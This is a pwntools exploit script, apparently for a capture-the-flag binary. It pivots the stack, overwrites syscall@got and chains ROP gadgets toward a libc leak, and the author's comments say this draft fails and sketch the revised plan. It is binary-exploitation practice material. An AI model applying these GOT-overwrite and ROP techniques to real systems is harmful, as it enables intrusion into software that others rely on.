from pwn import *
from time import sleep
io = process("./vuln",aslr=False)
gdb.attach(io,gdbscript="break *0x401162\n break *0x401168")

syscallGot = 0x404018

popRsiRdi = b"\x3a\xb4" # 1/16 times will be correct
syscallPlt = 0x401040 
newRbp = 0x404020
main1 = 0x401142
main2 = 0x40113e
ldSyscall = 0x401030

addRsp = 0x401016
ret = 0x401168

io.send(b"A"*8 + p64(syscallGot+8) + p64(main1))
pause()


newStack  = p64(newRbp) + (p64(addRsp)+b"A"*8)*135 + p64(ret) + p64(main2) + b"B"*0x10 
newStack += p64(syscallPlt) + p64(0) + p64(1) + p64(newRbp) + b"C"*0x10 + p64(ldSyscall) 
io.send(p64(ldSyscall) + newStack)
pause()

io.send(popRsiRdi)
io.interactive()

# the plan that I was trying to implement in this script
# 1. use leave to setup rbp to syscall@got-8, ret to 0x401142
# 2. overwrite syscall@got to 0x401030, *rbp=rbp, some addRsps, then 0x40113e, and setup rest of stack
# 3. overwrite syscall@got to pop rsi,ret back to 0x40113e
# 4. when call syscall@plt happens, pop rsi etc will happen, ret to syscall@plt
# 5. setup rsi,rdi (rdx,rcx prob remains the same, since it was setup, then step 4 happened), ret to 0x401142 to leak        libc 
# 6. restart the binary
# 
# doesn't work, 0x401030 messes up the stack


# I had the idea to setup rbp to be syscall@got+0x10 in the first step for quite some time already,
# but I didn't think it would work since I thought I needed to put syscall@got+0x10: syscall@got+0x8,
# so that when leave happened, rbp would be set to that, and I could overwrite syscall@got
# but the problem is when the next leave happened, and ret is gonna happen
# we will ret into syscall@got+0x8, and that wouldn'twork

# after the plan I was trying to implement above failed, I thought abt it more
# and realized that I could just use the "pop rbp" gadget in syscall@got+0x18, to set back up the rbp

# some the stuff I thought about while implementing the plan in this script still transfered over tho
# for example using addRsps and a ret gadget to get over the "call" problem (call will push ret ptr onto stack)
# and while thinking about the plan implemented in this script and while developing the exploit, I got rly
# familiar with the binary and had all these ideas in my head that I could just expand on/bounce around/use

# so yeah. Seriously, failure births success
